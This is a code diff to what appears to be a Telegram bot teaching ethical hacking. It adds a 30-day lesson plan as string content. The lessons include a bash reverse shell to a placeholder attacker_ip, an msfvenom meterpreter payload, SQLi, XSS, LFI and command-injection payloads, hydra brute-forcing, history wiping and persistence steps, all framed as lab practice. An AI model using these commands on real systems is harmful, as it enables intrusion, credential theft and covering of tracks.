@@ -14,6 +14,7 @@ topics = {
         ("⚙️ Advanced Hacking", "advanced"),
         ("🛠️ Tools & Installation", "tools"),
         ("📈 Career & Certifications", "career"),
+        ("🚀 Start Hacking", "Start"),
     ],
 
     "basic": [
@@ -26,6 +27,8 @@ topics = {
         ("Installing Kali Linux", "IKL"),
         ("Interesting Linux Commands", "ILC")
     ],
+
+    "Start": [(f"📅 Day {i}", f"day{i}") for i in range(1, 31)],
 
     "advanced": [
         ("🖥️ System Hacking", "system"),
@@ -366,8 +369,391 @@ content = {
 
     "jobs": "*Job Roles & Salaries:*\n\n- 🔍 Penetration Tester: ₹6–20 LPA\n- 🔐 Security Analyst: ₹5–15 LPA\n- 🧠 Security Consultant: ₹8–25 LPA\n- 🕵️ Ethical Hacker: ₹5–18 LPA\n- 👨‍💻 Security Researcher: ₹6–22 LPA\n\nSalaries vary by skill level, certifications, and experience. Freelance ethical hackers can also earn through bug bounty programs (e.g., HackerOne, Bugcrowd).",
 
-    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!"
+    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!",
+
+    "day1": "*📅 Day 1: Introduction to Ethical Hacking & Lab Setup*\n\n"
+    "Welcome to your hacking journey! Let's begin by understanding what ethical hacking is and how to set up a safe environment for practice.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Ethical Hacking\n"
+    "- Black Hat vs White Hat Hackers\n"
+    "- Setting Up Kali Linux in VirtualBox\n"
+    "- Updating & Upgrading Kali Linux\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Download VirtualBox and Kali Linux ISO\n"
+    "2. Create a VM and install Kali Linux\n"
+    "3. Run `sudo apt update && sudo apt upgrade`\n"
+    "4. Explore basic terminal: `ls`, `pwd`, `clear`, `whoami`\n\n"
+    "*🎥 Suggested Videos:*\n"
+    " [Introduction to Ethical Hacking](https://youtu.be/3HjAwJ8PfIs?si=GPWl7TwGr2o5uZ21)\n"
+    " [Black Hat vs White Hat Hackers](https://youtu.be/8C9HmCnoV0E?si=SKYIjEZXWF0U2yMU)\n"
+    " [Setting Up Kali Linux in VirtualBox](https://youtu.be/DfX5MB-zXEM?si=2jsbz8-Ce2bu15HF)\n\n"
+    "*✅ Outcome:* Kali Linux VM is set up and ready for use.",
+
+  "day2": "*📅 Day 2: Networking Essentials for Hackers*\n\n"
+    "Understanding how devices talk over the network is critical.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- OSI vs TCP/IP Model\n"
+    "- MAC, IP, Subnet, Ports\n"
+    "- Common Services: DNS, DHCP, HTTP, FTP\n"
+    "- Private vs Public IP\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Run `ifconfig` / `ip a` to view IP\n"
+    "2. Use `ping`, `traceroute`, `netstat`, `nslookup`\n"
+    "3. Use `nmap` to scan your own system: `nmap 127.0.0.1`\n\n"
+    "*🎥 Suggested Videos:*\n"
+    " [Networking Essentials for Hackers](https://youtu.be/xzGeiguILy8?si=GecBL6_EkyC9Z47d)\n\n"
+    "*✅ Outcome:* Able to analyze basic networking structure and run basic diagnostic commands.",
+
+  "day3": "*📅 Day 3: Linux Basics for Hackers*\n\n"
+    "Linux is a hacker’s favorite OS. Get comfortable with terminal usage.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Linux Directory Structure (/etc, /var, /usr)\n"
+    "- File Management: `cd`, `ls`, `mkdir`, `rm`\n"
+    "- Permissions: `chmod`, `chown`\n"
+    "- Piping and Redirection: `|`, `>`\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Navigate folders using `cd`, `ls -la`\n"
+    "2. Create and delete files with `touch`, `rm -rf`\n"
+    "3. Change file permissions: `chmod +x script.sh`\n"
+    "4. Combine commands: `cat file.txt | grep 'admin'`\n\n"
+    "*🎥 Suggested Videos:*\n"
+    " [Linux Basics for Hackers](https://youtu.be/PhYmmD84oFY?si=i2ggx3NdzXZZL4kq)\n\n"
+    "*✅ Outcome:* Comfortable with navigating and modifying Linux files via terminal.",
+
+  "day4": "*📅 Day 4: Bash Scripting & Automation*\n\n"
+    "Automation helps hackers save time. Today we’ll write basic bash scripts.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Bash\n"
+    "- Writing a simple bash script\n"
+    "- Variables and conditions\n"
+    "- For & While Loops\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Write a script to scan IPs using ping:\n"
+    "```bash\n"
+    "#!/bin/bash\n"
+    "for ip in {1..10}; do\n"
+    "  ping -c 1 192.168.0.$ip\n"
+    "done\n"
+    "```\n"
+    "2. Automate backup of files\n"
+    "3. Use `crontab` to schedule a script\n\n"
+    "*🎥 Suggested Videos:*\n"
+    " [Bash Scripting & Automation](https://youtu.be/CeCah9nD9XE?si=AYk7mkZ4gM2nmZVP)\n\n"
+    "*✅ Outcome:* Able to write and execute custom bash scripts.",
+
+  "day5": "*📅 Day 5: Footprinting and Reconnaissance*\n\n"
+    "Recon is the first step in hacking. It involves collecting data about the target.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Passive vs Active Recon\n"
+    "- WHOIS, DNS Records\n"
+    "- Google Dorking\n"
+    "- Social Engineering Basics\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `whois example.com`\n"
+    "2. Use `nslookup`, `dig`, `host`\n"
+    "3. Practice Google Dorking: `site:example.com intitle:login`\n"
+    "4. Install and try `theHarvester`\n"
+    "```bash\n"
+    "theHarvester -d example.com -l 100 -b google\n"
+    "```\n\n"
+    "*✅ Outcome:* You can collect basic intelligence about your targets.",
+
+  "day6": "*📅 Day 6: Scanning & Enumeration*\n\n"
+    "Learn how to actively scan targets and enumerate useful information.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Types of Scans (SYN, TCP, UDP)\n"
+    "- Enumeration Techniques\n"
+    "- Banner Grabbing\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `nmap -sS -sV target_ip`\n"
+    "2. Use `enum4linux` for SMB Enumeration\n"
+    "3. Banner grabbing with `telnet`, `netcat`, or `nmap`\n\n"
+    "*✅ Outcome:* Able to perform active scans and extract enumeration data.",
+
+      "day7": "*📅 Day 7: Vulnerability Scanning*\n\n"
+    "Vulnerabilities are weaknesses. Today we’ll learn to find them.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Vulnerability Scanning\n"
+    "- Types of Vulnerabilities\n"
+    "- Tools: Nessus, OpenVAS\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Install Nessus on Kali Linux\n"
+    "2. Scan local host for vulnerabilities\n"
+    "3. Analyze a report and identify CVEs\n\n"
+    "*✅ Outcome:* Able to run a vulnerability scan and understand the results.",
+
+  "day8": "*📅 Day 8: Exploitation Basics with Metasploit*\n\n"
+    "Let’s use Metasploit to understand how vulnerabilities are exploited.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Metasploit\n"
+    "- msfconsole Basics\n"
+    "- Exploit Modules & Payloads\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Start Metasploit: `msfconsole`\n"
+    "2. Search & run a simple exploit: `exploit/windows/smb/ms08_067_netapi`\n"
+    "3. Use `set payload` & `set RHOST`\n\n"
+    "*✅ Outcome:* Able to execute a basic exploit using Metasploit.",
+
+  "day9": "*📅 Day 9: Exploiting Web Applications (SQL Injection)*\n\n"
+    "Web apps are full of juicy targets. We’ll start with SQLi.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Introduction to SQL Injection\n"
+    "- Finding injectable parameters\n"
+    "- Manual SQLi Techniques\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Set up DVWA (Damn Vulnerable Web App)\n"
+    "2. Use `' OR 1=1 --` and `' UNION SELECT` payloads\n"
+    "3. Extract DB names using error-based SQLi\n\n"
+    "*✅ Outcome:* You can find and test SQLi vulnerabilities.",
+
+  "day10": "*📅 Day 10: XSS (Cross Site Scripting)*\n\n"
+    "XSS allows attackers to run scripts in users' browsers.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Types of XSS: Reflected, Stored, DOM\n"
+    "- Common payloads\n"
+    "- Bypassing filters\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use DVWA or bwapp for practice\n"
+    "2. Inject `<script>alert(1)</script>`\n"
+    "3. Use `document.cookie` to demonstrate cookie theft\n\n"
+    "*✅ Outcome:* Understand XSS and how to detect/test it.",
+
+    "day11": "*📅 Day 11: File Inclusion Vulnerabilities (LFI/RFI)*\n\n"
+    "File inclusion flaws can give access to system files or remote code.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is LFI and RFI\n"
+    "- Directory traversal\n"
+    "- Practical Payloads\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Setup DVWA or a vulnerable server\n"
+    "2. Try LFI using `?page=../../../../etc/passwd`\n"
+    "3. Demonstrate RFI if allowed with external file\n\n"
+    "*✅ Outcome:* Able to test for and exploit file inclusion issues.",
+
+  "day12": "*📅 Day 12: Command Injection & Remote Code Execution (RCE)*\n\n"
+    "Gain shell access by injecting system-level commands.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Command Injection vs RCE\n"
+    "- Indicators of Vulnerability\n"
+    "- Practical Exploits\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Identify vulnerable forms (e.g., ping, name fields)\n"
+    "2. Inject commands like `; id` or `| whoami`\n"
+    "3. Setup a Netcat listener to capture shell\n\n"
+    "*✅ Outcome:* Able to identify and exploit command injection flaws.",
+
+  "day13": "*📅 Day 13: Privilege Escalation Basics*\n\n"
+    "After exploitation, elevate privileges for deeper control.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Types of Privilege Escalation (Vertical & Horizontal)\n"
+    "- Linux & Windows PrivEsc Techniques\n"
+    "- Common misconfigurations\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `sudo -l` or weak SUID binaries\n"
+    "2. Use `winPEAS` and `linPEAS` enumeration tools\n"
+    "3. Exploit kernel or permission issues\n\n"
+    "*✅ Outcome:* Understand and perform privilege escalation.",
+
+  "day14": "*📅 Day 14: Password Cracking*\n\n"
+    "Learn how attackers break passwords and how to protect them.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Hashes vs Encryption\n"
+    "- Dictionary & Brute Force Attacks\n"
+    "- Tools: JohnTheRipper, Hashcat\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `john` to crack `/etc/shadow` sample\n"
+    "2. Use `hashid` to identify hash types\n"
+    "3. Try a bruteforce with `hydra` on SSH\n\n"
+    "*✅ Outcome:* Familiar with cracking tools and password security.",
+
+  "day15": "*📅 Day 15: Wireless Hacking Basics (WiFi)*\n\n"
+    "Targeting wireless networks opens up a lot of possibilities.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- WiFi encryption (WEP/WPA/WPA2)\n"
+    "- Monitor & Packet Injection\n"
+    "- Tools: Airmon-ng, Airodump-ng, Aircrack-ng\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Enable monitor mode: `airmon-ng start wlan0`\n"
+    "2. Capture handshake: `airodump-ng wlan0mon`\n"
+    "3. Crack handshake with `aircrack-ng` + wordlist\n\n"
+    "*✅ Outcome:* Able to analyze WiFi traffic and attempt WEP/WPA crack.",
+
+      "day16": "*📅 Day 16: Reverse Shells*\n\n"
+    "Learn how to gain remote access to a compromised system.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is a reverse shell\n"
+    "- TCP vs HTTP reverse shell\n"
+    "- Tools: Netcat, Bash, PHP, Python\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Start a Netcat listener: `nc -lvnp 4444`\n"
+    "2. Trigger a reverse shell from target: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`\n"
+    "3. Try reverse shell payloads in PHP/Python\n\n"
+    "*✅ Outcome:* Can execute reverse shells and receive connections.",
+
+  "day17": "*📅 Day 17: Post Exploitation Basics*\n\n"
+    "After access, what’s next? Learn how to maintain and leverage access.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Collecting information (credentials, users, history)\n"
+    "- Persistence Techniques\n"
+    "- Cleaning up traces\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `cat /etc/passwd`, `who`, `history`, `netstat`\n"
+    "2. Add a new user to keep access\n"
+    "3. Remove logs using `> ~/.bash_history`\n\n"
+    "*✅ Outcome:* Able to operate and maintain access after exploitation.",
+
+  "day18": "*📅 Day 18: Web Shells and PHP Exploits*\n\n"
+    "Use web shells to control a vulnerable web server.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Web shell basics (PHP/ASP)\n"
+    "- Common upload vulnerabilities\n"
+    "- Tools: Weevely, b374k\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Upload a web shell to DVWA\n"
+    "2. Access shell via browser\n"
+    "3. Use `weevely` to gain access\n\n"
+    "*✅ Outcome:* Able to use and manage a web shell session.",
+
+  "day19": "*📅 Day 19: Client-Side Attacks & Social Engineering*\n\n"
+    "Fool the human — the weakest link in cybersecurity.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Social Engineering\n"
+    "- Creating fake login pages\n"
+    "- USB Rubber Ducky, Phishing Kits\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `SEToolkit` to clone a login page\n"
+    "2. Host a phishing page on localhost\n"
+    "3. Send fake link via LAN or email (lab only)\n\n"
+    "*✅ Outcome:* Understand social engineering and phishing strategies.",
+
+  "day20": "*📅 Day 20: Malware Basics*\n\n"
+    "Create, analyze, and understand basic malware behavior.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Types of Malware\n"
+    "- Common Techniques\n"
+    "- Payload Generation with msfvenom\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Use `msfvenom` to create payload\n"
+    "   Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe`\n"
+    "2. Setup listener in Metasploit\n"
+    "3. Run on VM to test (do NOT use on real systems)\n\n"
+    "*✅ Outcome:* Able to generate and test simple payloads in a safe lab.",
+
+    "day21": "*📅 Day 21: Windows Hacking*\n\n"
+    "Understand Windows-specific vulnerabilities and techniques.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Windows privilege escalation paths\n"
+    "- Exploiting services and misconfigurations\n"
+    "- Using PowerShell for exploitation\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Enumerate Windows system info: `systeminfo`, `whoami`, `net user`\n"
+    "2. Use `winPEAS` or `PowerUp` for enumeration\n"
+    "3. Try local exploit (MS10-092 or similar in lab)\n\n"
+    "*✅ Outcome:* Can analyze and attempt privilege escalation on Windows targets.",
+
+  "day22": "*📅 Day 22: Linux Hacking*\n\n"
+    "Focus on hacking Linux-based systems.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Linux enumeration and privilege escalation\n"
+    "- Exploiting SUID, cron jobs, and writable scripts\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Check for SUID binaries: `find / -perm -4000 2>/dev/null`\n"
+    "2. Exploit writable cron job or misconfigured scripts\n"
+    "3. Use `linPEAS` to find privilege escalation paths\n\n"
+    "*✅ Outcome:* Can enumerate and exploit common Linux privilege escalation vectors.",
+
+  "day23": "*📅 Day 23: Web App Hacking - XSS, CSRF, IDOR*\n\n"
+    "Deep dive into modern web vulnerabilities.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Cross-Site Scripting (XSS)\n"
+    "- CSRF (Cross-Site Request Forgery)\n"
+    "- Insecure Direct Object References (IDOR)\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Practice XSS in DVWA and PortSwigger labs\n"
+    "2. Simulate CSRF in a form submission\n"
+    "3. Exploit IDOR by changing object IDs in URLs\n\n"
+    "*✅ Outcome:* Can identify and exploit common web application flaws.",
+
+  "day24": "*📅 Day 24: Cryptography Basics*\n\n"
+    "Understand the use of encryption and its weaknesses.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Hashing vs Encryption\n"
+    "- Common algorithms (MD5, SHA1, AES)\n"
+    "- Cracking hashes with `hashcat`, `john`\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Generate and crack hashes using `john`\n"
+    "2. Create AES encrypted messages using Python\n"
+    "3. Try cracking leaked hash dumps\n\n"
+    "*✅ Outcome:* Understand how cryptography can be used and abused in hacking.",
+
+  "day25": "*📅 Day 25: Bug Bounty 101*\n\n"
+    "Step into the world of legal hacking and rewards.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- What is Bug Bounty\n"
+    "- Platforms: HackerOne, Bugcrowd\n"
+    "- Vulnerability Disclosure Process\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Create an account on HackerOne or Bugcrowd\n"
+    "2. Read 5 disclosed reports\n"
+    "3. Try recon on a public program\n\n"
+    "*✅ Outcome:* Get started in bug bounty hunting and reporting.",
+
+  "day26": "*📅 Day 26: Vulnerability Scanning & Reporting*\n\n"
+    "Learn how to scan and document findings professionally.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Tools: Nessus, OpenVAS, Nikto\n"
+    "- Writing quality reports\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Scan with `nikto`, `nmap --script vuln`, or OpenVAS\n"
+    "2. Create a PDF report with impact and remediation\n\n"
+    "*✅ Outcome:* Able to generate, interpret scans and document vulnerabilities.",
+
+  "day27": "*📅 Day 27: Malware Analysis Basics*\n\n"
+    "Analyze malware behavior in a sandboxed environment.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Static vs Dynamic analysis\n"
+    "- Tools: strings, binwalk, Cuckoo Sandbox\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Analyze suspicious files with `strings` and `file`\n"
+    "2. Run malware in Cuckoo sandbox VM\n"
+    "3. Extract indicators of compromise (IOCs)\n\n"
+    "*✅ Outcome:* Can perform basic malware analysis and extract behavior.",
+
+  "day28": "*📅 Day 28: Red Team vs Blue Team*\n\n"
+    "Understand both offense and defense in cybersecurity.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Red Team (Attackers) TTPs\n"
+    "- Blue Team (Defenders) techniques\n"
+    "- Detection and logging\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Simulate attacks with Metasploit and monitor logs\n"
+    "2. Use Splunk/ELK for detection\n\n"
+    "*✅ Outcome:* Gain perspective on defense and offense synergy.",
+
+  "day29": "*📅 Day 29: Full Hack Simulation*\n\n"
+    "Test your combined skills in a full scenario.\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Recon to exploitation to privilege escalation\n"
+    "- Data exfiltration and cleanup\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Choose a vulnerable VM (TryHackMe, VulnHub)\n"
+    "2. Perform full chain: recon, exploit, escalate, exfiltrate\n\n"
+    "*✅ Outcome:* Ready to conduct end-to-end penetration tests.",
+
+  "day30": "*📅 Day 30: Graduation & Next Steps*\n\n"
+    "You’ve completed the journey — where do you go next?\n\n"
+    "*🧠 Topics Covered:*\n"
+    "- Certifications: OSCP, CEH, PNPT\n"
+    "- Career Paths: Red Teamer, Pentester, Analyst\n"
+    "- Building a Portfolio\n\n"
+    "*🛠️ Practical Tasks:*\n"
+    "1. Setup GitHub to document your learning\n"
+    "2. Contribute to open-source security tools\n"
+    "3. Apply for internships or research roles\n\n"
+    "*✅ Outcome:* Equipped to move into real-world hacking and security roles.",
+
 }
+
 keyword_content = {
     "nikto": content["nikto"],
     "linux command": content["LC"],
@@ -431,7 +817,7 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(
             text=content[topic_key],
             parse_mode="Markdown",
-            reply_markup=get_keyboard("main")
+            # reply_markup=get_keyboard("main")
         )
     else:
         await query.message.reply_text("❌ Invalid option. Please try again.")
